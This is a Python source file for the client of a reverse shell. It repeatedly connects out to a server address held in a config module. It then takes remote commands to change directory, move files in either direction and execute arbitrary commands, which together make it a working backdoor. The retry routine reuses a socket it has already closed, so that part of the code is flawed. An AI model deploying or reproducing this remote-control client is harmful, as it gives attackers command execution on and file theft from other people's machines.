import socket
import time
import server_config
import communication as comm
import command as cmd


def shell(s: socket.socket, verbose=False):
    while True:
        func, args = cmd.extract_command(comm.receive(s, verbose=verbose))

        # quit
        if func == "quit":
            break
        # clear
        elif func == "clear":
            pass
        # cd [target]
        elif func == "cd":
            cmd.cd(args)
        # (download|upload) [source] [target]
        elif func == "download":
            cmd.upload_file(s, args, verbose=verbose)
        elif func == "upload":
            cmd.download_file(s, args, verbose=verbose)
        # exec [func] [...args]
        elif func == "exec":
            cmd.exec_command(s, args)


def connection(s: socket.socket, address: tuple[str, int], timeout=5, verbose=False):
    while True:
        time.sleep(timeout)
        try:
            s.connect(address)
            shell(s, verbose)
            s.close()
            break
        except:
            s.close()
            connection(s, address, timeout)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection(
        sock,
        (server_config.IP, server_config.PORT),
        verbose=server_config.CLIENT_VERBOSE,
    )
